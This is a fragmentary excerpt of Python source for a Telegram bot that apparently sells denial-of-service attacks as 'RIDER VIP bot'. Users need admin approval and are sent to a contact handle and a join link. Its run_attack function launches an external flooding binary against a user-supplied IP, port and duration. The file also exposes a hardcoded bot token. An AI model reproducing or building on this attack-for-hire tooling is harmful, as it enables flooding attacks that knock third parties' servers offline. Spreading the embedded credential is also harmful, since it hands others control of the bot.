...
TELEGRAM_BOT_TOKEN = '7705205604:AAFE-PLJsePO3QlE-LO8OGK9sOJR5y6ZHGk'
...
async def add_user(update: Update, context: CallbackContext):
    ...
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command. DM - @RIDERBHAI00 *", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./known {ip} {port} {duration} 6 800"
        ...
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using RIDER VIP bot!*", parse_mode='Markdown')
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need approval or your access has expired. DM -@RIDERBHAI00.*", parse_mode='Markdown')
        return
    ...
    await context.bot.send_message(chat_id=chat_id, text=(
        ...
        f"*🔥 Join :- https://t.me/+Couazgq6Pz0xZGVl 💥*"
    ), parse_mode='Markdown')
